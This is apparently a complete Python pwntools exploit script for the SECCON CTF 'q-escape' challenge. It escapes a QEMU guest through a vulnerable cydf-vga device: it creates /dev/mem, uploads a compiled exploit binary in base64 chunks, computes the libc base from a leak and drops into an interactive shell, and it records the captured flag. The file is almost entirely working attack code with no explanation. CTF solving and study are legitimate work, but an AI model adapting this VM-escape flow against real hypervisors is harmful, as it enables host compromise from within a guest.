#!/usr/bin/env python2
# pylint: skip-file

from pwn import *

def do_pow():
  p.recvuntil('md5("')
  prefix = p.recvuntil('" +', drop=True)
  with context.local(log_level = 'warn'):
      ans = process(["./pow", prefix]).recvall().split("\n")[1]
      p.sendlineafter("320}):", ans)

def send_command(cmd, print_cmd = True, print_resp = False):
  if print_cmd:
    log.info(cmd)

  p.sendlineafter("/ #", cmd)
  resp = p.recvuntil("/ #")

  if print_resp:
    log.info(resp)

  p.unrecv("/ #")
  return resp

def setup():
  send_command("mknod -m 660 /dev/mem c 1 1")

def send_file(name):
  pcimem = read(name)
  f = b64e(pcimem)

  send_command("rm /a.gz.b64")
  send_command("rm /a")
  for i in range(len(f)/1000 + 1):
    log.info("Sending chunk {}/{}".format(i, len(f)/1000))
    send_command("echo -n '{}'>>/a.gz.b64".format(f[i*1000:(i+1)*1000]), False)

  send_command("cat /a.gz.b64 | base64 -d > /a.gz")
  send_command("gzip -d /a.gz")
  send_command("chmod +x /a")

def exploit():
  setup()


  with context.local(log_level = 'warn'):
    print process("make").recvall()
  send_file("./pwn.gz")

  with context.local(log_level = 'info'):
    p.sendlineafter("/ #", "/a")
    p.recvuntil("Hi\r\n")
    p.recvuntil("Leak\r\n")
    leak = u64(p.recvuntil("\nAddr", drop=True).ljust(8, "\x00"))
    log.info("leak: 0x{:x}".format(leak))
    libc.address = leak - libc.symbols["__printf_chk"]
    log.info("libc: 0x{:x}".format(libc.address))
    p.sendline("{:016X}".format(libc.address))
  p.interactive()

  # SECCON{6767ac011b200bde1249d241b1cd5480}

if __name__ == "__main__":
  name = "./qemu-system-x86_64"
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

  context.terminal=["tmux", "sp", "-h"]
  context.arch = "amd64"
  context.os = "linux"

  if len(sys.argv) > 1:
    p = remote("q-escape.pwn.seccon.jp", 1337)
    do_pow()
  else:
    p = process([ "./qemu-system-x86_64",
                  "-m", "64",
                  "-initrd", "./initramfs.igz",
                  "-kernel", "./vmlinuz-4.15.0-36-generic",
                  "-append", "priority=low console=ttyS0",
                  "-nographic",
                  "-L", "./pc-bios",
                  "-vga", "std",
                  "-device", "cydf-vga",
                  "-monitor", "telnet:127.0.0.1:2222,server,nowait"
                  ], env={}, stdin=PIPE, stdout=PIPE, stderr=PIPE)

    gdb.attach(p, """
    c
    """)

  exploit()
